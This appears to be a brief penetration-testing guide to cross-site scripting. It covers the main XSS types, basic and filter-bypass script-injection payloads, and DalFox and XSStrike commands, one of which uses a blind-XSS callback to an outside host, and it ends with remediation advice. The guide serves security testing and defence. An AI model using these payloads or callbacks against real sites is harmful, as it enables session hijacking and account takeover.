# Cross-Site Scripting (XSS) Testing Guide

## Types

### Reflected XSS
Input is immediately returned in the response. Test URL parameters, form fields, headers.

### Stored XSS
Input is stored and rendered later. Test comment fields, profile fields, file uploads.

### DOM-Based XSS
Vulnerability is in client-side JavaScript. Check document.location, document.URL, document.referrer sinks.

## Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

## Filter Bypass Payloads

```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<svg><script>alert&#40;1&#41;</script>
```

## Tools

### DalFox
```bash
dalfox url "http://target/search?q=test" --blind "https://your.xss.ht"
```

### XSStrike
```bash
xsstrike -u "http://target/search?q=test"
```

## Remediation
- Output encoding (HTML entity, URL, JavaScript encoding based on context)
- Content Security Policy (CSP) headers
- HTTPOnly and Secure cookie flags
- Input validation (but never rely on this alone)
